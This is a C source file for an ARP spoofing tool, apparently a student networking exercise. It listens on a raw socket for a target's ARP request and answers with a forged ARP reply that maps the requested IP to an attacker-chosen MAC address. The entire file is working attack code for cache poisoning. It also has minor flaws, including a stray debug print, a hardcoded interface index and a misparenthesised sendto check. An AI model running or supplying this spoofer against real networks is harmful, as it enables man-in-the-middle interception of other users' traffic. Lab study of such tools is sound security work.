#include "main.h"

t_data data;


int check_args(int ac, char **av)
{
	int ret = 0;

	if (ac < 5) {
		printf("Need at least 4 arguments\n");
		return (0);
	}
	if (ac == 5 || ac == 6) {
		if ((ret = check_ip(av[1], av[3])) != 0) {
			printf("Error on ip %d\n", ret);
			return (0);
		}
		if ((ret = check_mac(av[2], av[4])) != 0) {
			printf("Error on mac %d\n", ret);
			return (0);
		}
		if (ac == 6) {
			printf("ici %sn", av[5]);
			if (strcmp(av[5], "-v") == 0)
				data.print_info = 1;
			else {
				printf("Wrong option, try -v\n");
				return (0);
			}
		}
		return (1);
	}
	else {
		printf("Too much arguments");
		return (0);
	}
}

unsigned char	*craft_arp(unsigned char *output)
{
	struct ethhdr frame;
	struct arp_header packet;

	memset(&frame, 0, sizeof(frame));
	memset(&packet, 0, sizeof(packet));
	memcpy(frame.h_dest, data.params.target_mac, 6);
	memcpy(frame.h_source, data.params.source_mac, 6);
	memcpy(&frame.h_proto, "\x08\x06", 2);
	memcpy(packet.Hardware, "\x00\x01", 2);
	memcpy(packet.Protocol, "\x08\x00", 2);
	packet.HardwareAddressLen = 6;
	packet.ProtocolAddressLen = 4;
	memcpy(packet.Operation, "\x00\x02", 2); /* ARP REPLY OPCODE */
	memcpy(packet.SenderHardwareAddr, data.params.source_mac, 6);
	memcpy(packet.SenderIpAddr, &data.params.source_ip, 4);
	memcpy(packet.TargetHardwareAddr, data.params.target_mac, 6);
	memcpy(packet.TargetIPAddr, &data.params.target_ip, 4);
	memcpy(output, &frame, sizeof(frame));
	memcpy(output+sizeof(frame), &packet, sizeof(packet));
	return (output);
}


void arp_reply(struct arp_header *request)
{
	struct sockaddr_ll device = {0};
	int bytes_sent = 0;
	unsigned char reply_output[42];

	memset(&device, 0, sizeof(struct sockaddr_ll));
	device.sll_family = AF_PACKET;
	device.sll_ifindex = 2;
	device.sll_halen = ETH_ALEN;
	device.sll_protocol = htons(ETH_P_ARP);
	memcpy(device.sll_addr, data.params.target_mac, ETH_ALEN);
	
	printf("Corresponding ARP request detected from %d.%d.%d.%d (\"Who has %d.%d.%d.%d ?\")\n",
	request->SenderIpAddr[0], request->SenderIpAddr[1], request->SenderIpAddr[2], request->SenderIpAddr[3],
	request->TargetIPAddr[0], request->TargetIPAddr[1], request->TargetIPAddr[2], request->TargetIPAddr[3]);
	
	craft_arp(reply_output);
	
	printf("\e[0m\nSending spoofed response (\"%d.%d.%d.%d is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\")\n", request->TargetIPAddr[0], request->TargetIPAddr[1], request->TargetIPAddr[2], request->TargetIPAddr[3], data.params.source_mac[0], data.params.source_mac[1], data.params.source_mac[2], data.params.source_mac[3], data.params.source_mac[4], data.params.source_mac[5]);

	if ((bytes_sent = sendto(data.sockfd, reply_output, sizeof(reply_output), 0, (struct sockaddr *)&device, sizeof(device)) < 0))
		exit(EXIT_FAILURE);
	data.waiting = 0;
}

void process_arp(unsigned char *buffer)
{
	struct arp_header *arp_h = (struct arp_header *)(buffer);

	buffer += sizeof(struct arphdr);

	//if (data.print_info) {
		printf("\n----ARP PAYLOAD:----\n");
		printf("|-Sender MAC address: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5]);
		buffer += arp_h->HardwareAddressLen;
		printf("|-Sender IP address: %d.%d.%d.%d\n", buffer[0], buffer[1], buffer[2], buffer[3]);
		buffer += arp_h->ProtocolAddressLen;
		printf("|-Target MAC address: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5]);
		buffer += arp_h->HardwareAddressLen;
		printf("|-Target IP address: %d.%d.%d.%d\n", buffer[0], buffer[1], buffer[2], buffer[3]);
		buffer += arp_h->ProtocolAddressLen;

		if (arp_h->Operation[0] || (arp_h->Operation[1] < 1 || arp_h->Operation[1] > 2))
			printf("|-opcode: %.2x (Unknown operation)\n", arp_h->Operation[1]);
		else
			printf("|-opcode: %.2x %s\n", arp_h->Operation[1], (arp_h->Operation[1] == 1) ? "(REQUEST)" : "(REPLY)");
	//}

	if (arp_h->Operation[0] == 0 && arp_h->Operation[1] == 1) //Check ARP Request
	{
		unsigned char temp_target_ip[4];
		memcpy(temp_target_ip, &data.params.target_ip, sizeof(data.params.target_ip));
		unsigned char temp_source_ip[4];
		memcpy(temp_source_ip, &data.params.source_ip, sizeof(data.params.source_ip));

		if (memcmp(arp_h->SenderIpAddr, temp_target_ip, 4) == 0)
			if (memcmp(arp_h->SenderHardwareAddr, data.params.target_mac, 6) == 0)
				if (memcmp(arp_h->TargetIPAddr, temp_source_ip, 4) == 0)
						arp_reply(arp_h);
	}
}

int main(int ac, char **av)
{
	unsigned char buffer[1500];
	ssize_t buflen = 0;
	struct sockaddr saddr;
	int saddr_len = sizeof(saddr);
	struct ifaddrs	*interface = NULL;
	struct ethhdr *eth = NULL;

	data.iflist = NULL;
	data.sockfd = -1;
	data.waiting = 1;	
	data.print_info = 0;

	if (!check_args(ac, av))
		exit(1);
	if (signal(SIGINT, sig_handler) == SIG_ERR)
		exit(EXIT_FAILURE);
	if ((data.sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
		printf("%s", strerror(errno));
		exit(EXIT_FAILURE);
	}
	if ((getifaddrs(&data.iflist) < 0)) {
		printf("%s", strerror(errno));
		exit(EXIT_FAILURE);
	}
	if ((interface = getinterface("enp0s3")))
		printf("Working on interface %s.\n", interface->ifa_name);
	else {
		printf("Interface not found");
		exit(EXIT_FAILURE);
	}
	memset(buffer, 0, sizeof(buffer));
	memset(&data.params, 0, sizeof(data.params));
	data.params.source_ip = inet_addr(av[1]);
	mac_strbin(data.params.source_mac, av[2]);
	data.params.target_ip = inet_addr(av[3]);
	mac_strbin(data.params.target_mac, av[4]);
	while (data.waiting)
	{
		buflen = recvfrom(data.sockfd, buffer, sizeof(buffer), 0, &saddr, (socklen_t *)&saddr_len);
		if (buflen < 0) {
			printf("%s\n", strerror(errno));
			exit(EXIT_FAILURE);
		}
		eth = (struct ethhdr *)buffer;
		if (ntohs(eth->h_proto) == ETH_P_ARP)
		{
			if (data.print_info) {
				write(1, "\n*** ARP PACKET ***\nRaw frame:", sizeof("\n*** ARP PACKET ***\nRaw frame:"));
				write(1, "\n", sizeof("\n"));
				print_buff(buflen, buffer);
				printf("\n");
				printf("(%d bytes read from socket)\n", (unsigned int)buflen);
			}
			process_arp(buffer+sizeof(struct ethhdr));
		}
		memset(buffer, 0, sizeof(buffer));
	}
}
